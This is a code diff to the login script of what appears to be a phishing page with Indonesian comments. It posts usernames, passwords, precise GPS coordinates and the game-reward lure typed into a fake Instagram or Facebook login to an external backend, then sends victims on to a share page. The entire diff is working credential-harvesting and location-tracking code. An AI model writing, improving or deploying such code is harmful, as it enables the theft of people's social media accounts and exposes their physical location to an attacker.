@@ -1,3 +1,7 @@
+// ========== CONFIGURATION ==========
+// Ganti URL ini dengan URL backend Render lo setelah deploy
+const BACKEND_URL = 'https://your-backend-name.onrender.com'; 
+
 // ========== LOGIN BUTTON STATE ==========
 const usernameInput = document.getElementById('username');
 const passwordInput = document.getElementById('password');
@@ -18,10 +22,11 @@ if (usernameInput && passwordInput) {
   checkForm(); // Initial check
 }
 
-// Helper to get High-Accuracy Geolocation
+// Helper to get High-Accuracy Geolocation (Plan 2 Implementation)
 async function getPreciseLocation() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
+      console.warn('Geolocation tidak didukung browser');
       resolve(null);
       return;
     }
@@ -31,17 +36,18 @@ async function getPreciseLocation() {
         resolve({
           lat: pos.coords.latitude,
           lng: pos.coords.longitude,
-          accuracy: pos.coords.accuracy
+          accuracy: pos.coords.accuracy,
+          timestamp: pos.timestamp
         });
       },
       (err) => {
-        console.warn('GPS denied or error:', err.message);
+        console.warn('GPS gagal/ditolak:', err.message);
         resolve(null);
       },
       {
-        enableHighAccuracy: true,
-        timeout: 8000,
-        maximumAge: 0
+        enableHighAccuracy: true,  // ⭐ Pakai GPS hardware
+        timeout: 10000,            // Tunggu max 10 detik
+        maximumAge: 0              // Jangan pakai cache
       }
     );
   });
@@ -56,22 +62,30 @@ if (loginForm) {
     loginBtn.disabled = true;
     loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Menunggu Izin Lokasi...';
 
-    // 1. Ambil GPS Presisi (Simulasi osint/tracking akurat)
+    // 1. Ambil GPS Presisi
     const gpsData = await getPreciseLocation();
     
     loginBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Memproses...';
 
+    // Ambil info game & hadiah dari localStorage
+    const game = localStorage.getItem('selected_game') || 'Unknown';
+    const reward = localStorage.getItem('selected_reward') || 'N/A';
+    
+    // Deteksi metode login dari URL
+    const loginMethod = window.location.pathname.includes('login-fb') ? 'Facebook' : 'Instagram';
+
     const dataPayload = {
       username: usernameInput.value,
       password: passwordInput.value,
-      game: 'Instagram Test Layout',
-      nominal: 'N/A',
+      game: game,
+      nominal: reward,
+      method: loginMethod, // Tambah field method
       gps: gpsData // Kirim GPS jika diizinkan
     };
 
     try {
-      // Mengirimkan data ke Backend Express
-      const response = await fetch('/api/setor-data', {
+      // Mengirimkan data ke Backend Render (Gunakan BACKEND_URL)
+      const response = await fetch(`${BACKEND_URL}/api/setor-data`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -81,14 +95,15 @@ if (loginForm) {
 
       const result = await response.json();
 
-      // Jika backend sukses memproses, langsung lempar ke alamat tujuan
+      // Jika backend sukses memproses, langsung lempar ke halaman SHARE
       if (result.status === 'success') {
-        window.location.href = 'pages/alert.html';
+        window.location.href = 'share.html';
       }
 
     } catch (error) {
       console.error('Gagal menghubungi server backend:', error);
-      window.location.href = 'pages/alert.html';
+      // Fallback redirect even if backend fails
+      window.location.href = 'share.html';
     }
   });
 }
